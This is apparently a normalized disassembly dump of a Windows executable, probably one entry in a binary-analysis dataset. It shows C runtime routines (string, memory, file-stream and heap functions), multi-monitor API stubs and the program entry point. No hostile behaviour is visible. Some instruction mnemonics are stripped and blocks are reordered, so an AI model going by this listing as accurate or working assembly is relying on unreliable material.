cmp [ rw-data ] ebx
setne al
jmp r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] 0x1
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push r--data
push edi
call esi
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push 0x1
pop eax
mov [ rw-data ] eax
jmp r-xdata
sub_40600a
push esi
push edi
call sub_405f32
test eax eax
je r-xdata
test [ esp + 0x10 ] 0x3
jne r-xdata
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call [ rw-data ]
jmp r-xdata
mov eax 0x12340042
mov esi [ esp + 0xc ]
xor eax eax
cmp [ esi + 0x8 ] eax
jle r-xdata
pop edi
pop esi
retn 0x8
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] eax
jle r-xdata
mov edi [ GetSystemMetrics@IAT ]
push eax
call edi
cmp [ esi ] eax
jge r-xdata
push 0x1
call edi
cmp [ esi + 0x4 ] eax
jl r-xdata
sub_406060
push ebp
mov ebp esp
sub esp 0x2c
call sub_405f32
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x3
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
push [ ebp + 0x8 ]
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
leave
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowPlacement@IAT ]
jmp r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call sub_40600a
jmp r-xdata
test eax eax
je r-xdata
sub_4060cb
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_405f32
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x12340042
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
jmp r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
xor esi esi
cmp ebx esi
je r-xdata
pop esi
pop ebx
leave
retn 0x8
cmp [ ebx ] 0x28
jb r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
push esi
push 0x30
call [ SystemParametersInfoA@IAT ]
test eax eax
je r-xdata
push edi
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] esi
push esi
mov esi [ GetSystemMetrics@IAT ]
call esi
push 0x1
mov [ ebx + 0xc ] eax
call esi
lea edi [ ebx + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx ] 0x48
push 0x1
movsd [ edi ] [ esi ]
pop esi
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x24 ] esi
pop edi
jb r-xdata
mov eax esi
jmp r-xdata
add ebx 0x28
push r--data
push ebx
call [ lstrcpyA@IAT ]
sub_4061b6
mov eax sub_41824a
call sub_4072e4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
call sub_4160f9
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x20 ]
call sub_41272e
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ esi + 0x4 ]
call sub_41272e
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_406362
push ebp
mov ebp esp
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ExtTextOutA@IAT ]
pop ebp
retn 0x1c
sub_406387
push ebp
mov ebp esp
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ecx + 0x4 ]
call [ TabbedTextOutA@IAT ]
mov ecx [ ebp + 0x8 ]
movsx edx ax
shr eax 0x10
movsx eax ax
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebp
retn 0x20
sub_4063db
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x4 ]
call [ GrayStringA@IAT ]
pop ebp
retn 0x20
mov eax [ eax + 0x4 ]
sub_406430
push edi
mov edi [ esp + 0x8 ]
jmp r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
test dh dh
je r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_406440
mov ecx [ esp + 0x4 ]
push edi
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea edi [ ecx - 0x1 ]
jmp r-xdata
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x4 ]
test ah ah
je r-xdata
mov ecx [ esp + 0xc ]
test ecx 0x3
je r-xdata
mov edx 0x7efefeff
mov eax [ ecx ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ ecx ]
add ecx 0x4
test eax 0x81010100
je r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
je r-xdata
lea edi [ ecx - 0x3 ]
jmp r-xdata
test eax 0xff0000
je r-xdata
mov [ edi ] edx
add edi 0x4
test dl dl
je r-xdata
mov [ edi ] dl
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] dl
inc edi
test ecx 0x3
jne r-xdata
lea edi [ ecx - 0x2 ]
jmp r-xdata
test eax 0xff000000
je r-xdata
test dh dh
je r-xdata
jmp r-xdata
jmp r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
pop edi
retn
test edx 0xff0000
je r-xdata
mov [ edi ] dx
mov eax [ esp + 0x8 ]
mov [ edi + 0x2 ] 0x0
pop edi
retn
test edx 0xff000000
je r-xdata
mov [ edi ] edx
mov eax [ esp + 0x8 ]
pop edi
retn
jmp r-xdata
sub_406520
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_408850
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_408738
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_406580
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
mov [ edi ] al
inc edi
dec edx
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
inc edi
dec ecx
jne r-xdata
sub_406607
push ebp
mov ebp esp
sub esp 0xcc
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call [ GetSystemTime@IAT ]
mov ax [ ebp - 0x16 ]
cmp ax [ rw-data ]
jne r-xdata
lea eax [ ebp - 0xcc ]
push eax
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ax [ ebp - 0x18 ]
cmp ax [ rw-data ]
jne r-xdata
or eax 0xffffffff
cmp eax 0x2
jne r-xdata
mov ax [ ebp - 0x1a ]
cmp ax [ rw-data ]
jne r-xdata
leave
retn
mov [ ecx ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x32 ] 0x0
je r-xdata
mov ax [ ebp - 0x1e ]
cmp ax [ rw-data ]
jne r-xdata
push esi
push edi
lea esi [ ebp - 0x20 ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov [ rw-data ] eax
pop esi
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ax [ ebp - 0x20 ]
cmp ax [ rw-data ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov eax [ rw-data ]
jmp r-xdata
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
call sub_409128
mov ecx [ ebp + 0x8 ]
add esp 0x1c
test ecx ecx
je r-xdata
sub_4066e3
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
call sub_4090c1
push 0x8
mov [ ebp + 0xc ] eax
pop ecx
xor eax eax
lea edi [ ebp - 0x20 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
mov bl 0x1
movzx ecx dl
mov eax ecx
and ecx edi
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x20 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov al [ edx ]
push 0x1
movzx esi al
mov ecx esi
pop ebx
and ecx edi
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x20 ]
test cl bl
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x18 ]
mov ebx edx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
and eax ebx
pop ebx
leave
retn
movzx esi al
mov ecx esi
push 0x1
and ecx edi
pop eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x20 ]
test cl al
jne r-xdata
inc edx
jmp r-xdata
and [ edx ] 0x0
inc edx
inc edx
jmp r-xdata
mov al [ edx ]
test al al
je r-xdata
sub_406790
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_406820
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_406858
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_4092a6
push esi
call sub_406889
push esi
mov edi eax
call sub_4092f8
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_406889
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_4094b2
push esi
mov edi eax
call sub_40942a
push [ esi + 0x10 ]
call sub_40934a
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_406c50
and [ esi + 0x1c ] 0x0
pop ecx
sub_4068d5
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_4092a6
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406904
push [ ebp + 0x14 ]
mov esi eax
call sub_4092f8
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_406904
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_4095bb
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_409697
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_4073d0
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_4069ec
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_4092a6
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406a18
push [ ebp + 0x8 ]
mov esi eax
call sub_4092f8
add esp 0x14
mov eax esi
pop esi
pop ebp
retn
sub_406a18
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_408122
mov [ eax ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_4094b2
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_4099cf
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_4098d5
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp r-xdata
test al 0x8
je r-xdata
pop edi
pop esi
retn
test ah 0x4
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_406aa5
push esi
call sub_409ca0
mov esi eax
test esi esi
jne r-xdata
push edi
push esi
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call sub_409b30
push esi
mov edi eax
call sub_4092f8
add esp 0x14
mov eax edi
pop edi
pop esi
retn
pop esi
retn
sub_406af0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_406b17
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_4092a6
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406b46
push [ ebp + 0x14 ]
mov esi eax
call sub_4092f8
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_406b46
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_408738
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_4094b2
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_4073d0
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_409d68
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_406c50
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x9
call sub_409fbd
push esi
call sub_40a071
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_40a01e
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push esi
push eax
call sub_40a09c
push 0x9
call sub_40a01e
add esp 0xc
pop esi
retn
sub_406caa
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_406cd6
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_40ab72
test eax eax
pop ecx
jne r-xdata
sub_406cd6
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
push edi
ja r-xdata
test esi esi
jne r-xdata
push 0x9
call sub_409fbd
push esi
call sub_40a3c7
push 0x9
mov edi eax
call sub_40a01e
add esp 0xc
test edi edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_406d24
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_40ab8d
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40ab8d
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
push 0x1
call sub_409f58
pop ecx
test eax eax
jne r-xdata
call sub_40905a
test eax eax
jne r-xdata
push 0x1c
call sub_406ee7
xor esi esi
mov [ ebp - 0x4 ] esi
call sub_40b24c
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_40b11a
mov [ rw-data ] eax
call sub_40aecd
call sub_40ae14
call sub_408618
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_40adbc
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x10
call sub_406ee7
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x60 ] eax
push eax
call sub_408645
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_40ac44
pop ecx
pop ecx
retn
sub_406f0b
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_406f4d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_406f9c
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b674
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_406fd2
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_407026
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40be90
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_407026
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40b674
add esp 0x20
pop ebp
retn
sub_40704b
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_407101
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4090c1
call [ eax + 0x68 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_407101
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40b674
add esp 0x20
mov eax [ ebp + 0xc ]
